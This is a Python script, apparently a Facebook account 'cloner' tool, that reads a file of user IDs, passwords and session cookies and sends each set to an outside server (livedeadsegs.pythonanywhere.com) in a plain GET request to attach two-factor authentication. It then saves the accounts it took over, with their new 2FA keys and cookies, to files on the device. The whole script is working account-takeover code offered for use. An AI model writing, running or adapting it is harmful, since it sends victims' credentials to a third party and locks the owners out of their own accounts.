"""
echo "Written by Ahmed Ali"

"""

import os
import re
import base64
import requests

class TwoFactorCloner:
    GREEN = '\x1b[1;92m'
    RED = '\x1b[1;91m'
    YELLOW = '\x1b[1;93m'
    WHITE = '\x1b[1;97m'
    
    def __init__(self):
        self.ok = 0
        self.fail = 0

    def AUTO_2F(self, uid, password, cookie):
        if "sb=" not in cookie:
            sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
            cookie = f"sb={sb};{cookie}"
        else:
            pass
        cookies = {"Cookie" : cookie}
        link = f"https://livedeadsegs.pythonanywhere.com/TWO_FACTOR?uid={uid}&password={password}&cookie={cookie}"
        send_req = requests.get(link).text
        return send_req

    def divider(self):
        print(f"{self.WHITE}-" * 54)

    def run(self):
        os.system("clear")
        self.divider()
        print(f"{self.GREEN}This tool is created by Ahmed Ali")
        print(f"{self.YELLOW}This tool is made for cloners to add 2F in their account. In file idz must be in uid|pass|cookie format")
        print(f"{self.GREEN}Live idz will be saved in 2f_live.txt and 2f_live_with_cookies.txt and /sdcard/2f_live_with_key.txt")
        print(f"{self.RED}Dead idz will be saved in 2f_failed.txt")
        self.divider()
        
        get_file = input("Enter file path: ")
        try:
            get_file_info = open(get_file, 'r').read().splitlines()
        except FileNotFoundError:
            exit("File not found")

        for element in get_file_info:
            if element == "":
                break
            try:
                uid, password, cookie = element.split("|")
            except ValueError:
                self.divider()
                print(f"{self.YELLOW}[WRONG FORMAT] " + element)
                self.divider()
                with open("/sdcard/wrong_format.txt", 'a') as f:
                    f.write(element + '\n')
                continue

            data = self.AUTO_2F(uid=uid, password=password, cookie=cookie)
            if '[2F]' in data:
                datax = data.replace("[2F] ", "")
                print(f"{self.GREEN}[2F] {datax}")
                self.ok += 1
                with open("/sdcard/2f_live.txt", 'a') as f:
                    f.write(element + '\n')
                with open("/sdcard/2f_live_with_key.txt", 'a') as f:
                    f.write(datax + '\n')
                with open("/sdcard/2f_live_with_cookies.txt", "a") as f:
                    f.write(f"{datax}|{cookie}\n")
            elif 'Cookies lol' in data:
                print(f"{self.RED}[FL] {data}")
                self.fail += 1
                with open("/sdcard/2f_failed.txt", 'a') as f:
                    f.write(element + '\n')
                with open("/sdcard/2f_failed_uid.txt", 'a') as f:
                    f.write(f"{uid}|{password}\n")
            elif 'wrong password' in data:
                print(f"{self.WHITE}[WR] {data}")
                self.fail += 1
                with open("/sdcard/wrong_pass.txt", 'a') as f:
                    f.write(element + '\n')
            else:
                print("Error" + data)

        print(f"\033[1;37mTotal Checked {len(get_file_info)} uid\n2F added: \033[1;32m{str(self.ok)}\n\033[1;37m2F Failed: \033[1;31m{str(self.fail)}")

if __name__ == "__main__":
    cloner = TwoFactorCloner()
    cloner.run()
